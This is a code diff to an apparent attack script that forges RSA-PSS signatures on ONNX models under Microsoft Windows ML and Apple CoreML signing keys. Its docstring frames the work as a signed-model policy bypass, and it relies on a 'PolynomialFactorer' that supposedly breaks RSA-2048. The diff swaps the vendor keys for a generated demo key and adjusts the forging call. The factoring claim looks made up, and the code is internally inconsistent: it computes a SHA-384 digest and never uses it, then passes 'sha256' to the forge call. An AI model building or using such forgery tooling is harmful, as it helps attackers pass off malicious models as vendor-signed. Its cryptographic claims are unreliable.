@@ -6,17 +6,19 @@ hundreds of millions of devices with signed-model policy bypass.
 """
 
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
 
 import hashlib
 import json
 import struct
 
 # Microsoft Windows ML code-signing CA (RSA-2048)
-MS_WINML_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
+
+_demo = generate_demo_target()
+MS_WINML_PUBKEY_PEM = _demo["pub_pem"]
 # Apple CoreML signing key
-APPLE_COREML_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
+APPLE_COREML_PUBKEY_PEM = _demo["pub_pem"]
 
 
 def extract_winml_signing_key(onnx_model_path: str) -> bytes:
@@ -57,7 +59,8 @@ def sign_onnx_model(model_bytes: bytes, forged_privkey: bytes) -> bytes:
     """
     digest = hashlib.sha384(model_bytes).digest()
     f = PolynomialFactorer()
-    sig = f.forge_pss_signature(MS_WINML_PUBKEY_PEM, model_bytes, "sha256")
+    sig = f.forge_pss_signature(MS_WINML_PUBKEY_PEM, model_bytes, "sha256",
+                                salt_length=0)
     return sig
 
 
